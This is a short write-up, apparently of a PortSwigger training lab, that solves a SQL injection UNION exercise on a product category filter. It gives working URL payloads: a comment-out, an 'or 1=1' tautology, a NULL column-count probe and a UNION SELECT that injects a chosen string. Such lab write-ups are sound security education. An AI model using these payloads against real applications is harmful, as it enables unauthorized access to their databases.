
# SQL injection UNION attack, finding a column containing text

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

---------------------------------------------

Reference: https://portswigger.net/web-security/sql-injection/union-attacks

---------------------------------------------

We see there are 2 values displayed in the table, the name and the price of the products:



![img](images/SQL%20injection%20UNION%20attack,%20finding%20a%20column%20containing%20text/1.png)


We find these payload are valid to display the 4 items in Accessories and all the items:

```
/filter?category=Accessories'--
/filter?category=Accessories'+or+1=1--
```

Also, that there are 3 columns returned by the query and we can do a UNION attack with:

```
/filter?category=Accessories'+union+all+select+NULL,NULL,NULL--
```


We can print the string Qrc0Pq setting this string in the second value of the attack:

```
/filter?category=Accessories'+union+all+select+'0','Qrc0Pq','1234'--
```



![img](images/SQL%20injection%20UNION%20attack,%20finding%20a%20column%20containing%20text/2.png)